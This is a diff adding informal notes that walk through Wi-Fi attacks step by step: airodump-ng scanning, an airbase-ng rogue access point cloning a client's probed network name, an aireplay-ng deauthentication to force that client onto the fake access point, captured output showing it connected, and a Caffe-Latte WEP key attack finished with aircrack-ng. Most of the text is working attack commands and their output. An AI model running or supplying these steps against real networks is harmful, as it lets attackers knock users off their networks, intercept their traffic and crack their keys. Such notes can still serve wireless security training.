@@ -1,0 +1,65 @@
+
+
+... honeypot attack.
+... when we run the following command, at the lower portions of the command
+
+ # airodump-ng wlan0mon
+
+ BSSID              STATION            PWR   Rate    Lost    Frames  Probe                                                       u(not associated)   44:C3:46:FB:63:C1  -82    0 - 1      0        2                                                                (not associated)   00:1E:AD:35:8E:29  -86    0 - 1      0        1                                                                
+(not associated)   24:0D:65:0B:53:38  -86    0 - 1     51        5  abony                                                       
+54:A0:50:CC:53:FD  E0:B9:A5:7F:56:1D    0    0e- 0e     0       39                                                                EC:08:6B:E9:6E:06  70:0B:C0:7D:1D:A8   -1    1e- 0      0        5                                                                10:DA:43:DF:5D:7E  88:AD:D2:B1:14:F2  -88    1e- 1      0        3 
+
+ ... from this output the client 24:0D:65:0B:53:38 is looking for the access-point
+ ... abony from his previous connected list. there fore if we create one rougue
+ ... ap name abony and lure the client to connect to this ap we can trap it 
+ ... a honeypot.
+
+ # airbase-ng -a aa:aa:aa:bb:bb:bb -e "abony" -c 3 wlan0mon
+
+For information, no action required: Using gettimeofday() instead of /dev/rtc
+18:44:56  Created tap interface at2
+18:44:56  Trying to set MTU on at2 to 1500
+18:44:56  Access Point with BSSID AA:AA:AA:BB:BB:BB started.
+Error: Got channel -1, expected a value > 0.
+
+... here we have created one ap with the fake bssid is aa:aa:aa:bb:bb:bb and with the
+... legitimaze essid abony. now disconnect the client 24:0D:65:0B:53:38 from all associated
+... ap and see what happened. as this client is not associated with any bssid so we 
+... use its essid to disconnect it.
+
+ # aireplay-ng --deauth 1 -e "abony" -c 24:0D:65:0B:53:38 --ignore-negative-one wlan0mon
+
+18:46:14  Waiting for beacon frame (ESSID: abony) on channel -1
+Found BSSID "AA:AA:AA:BB:BB:BB" to given ESSID "abony".
+18:46:15  Sending 64 directed DeAuth. STMAC: [24:0D:65:0B:53:38] [ 0| 0 ACKs]
+
+... now we will see wheather the client is trying to connect with the fake ap or not.
+
+ # airodump-ng wlan0mon
+
+ BSSID              STATION            PWR   Rate    Lost    Frames  Probe                                                         AA:AA:AA:BB:BB:BB  24:0D:65:0B:53:38  -82    0 - 1    522      135                                                                54:A0:50:CC:53:FD  E0:B9:A5:7F:56:1D    0    1e- 0e     0       35                                                                90:8D:78:14:77:D1  F4:0E:22:A8:D6:25   -1    0e- 0      0        1                                                                   
+... from this output we have seen that client 24:0D:65:0B:53:38 is connected with the
+... fake ap AA:AA:AA:BB:BB:BB. therefore trapped to our honeypot.
+
+... we can see the whole procedure in wireshark using the filter 
+... wlan.sa==24:0D:65:0B:53:38 
+
+... ### latte coffee attack.
+
+... if one client used ever wep for authentication in anywhere we can use caffe-latte
+... attack by creating one ap like below with the options -L.
+
+ # airbase-ng -a aa:aa:aa:bb:bb:bb -e "Trishika" -c 3 -W 1 -L wlan0mon
+
+For information, no action required: Using gettimeofday() instead of /dev/rtc
+19:18:32  Created tap interface at2
+19:18:32  Trying to set MTU on at2 to 1500
+19:18:32  Access Point with BSSID AA:AA:AA:BB:BB:BB started.
+Error: Got channel -1, expected a value > 0.
+
+... when any client which has been used this ap with wep, caffe latte will start
+... automatically.
+
+... after collecting enough packets we can use the aircrack-ng command to crack the
+... wep key containing packets.
+
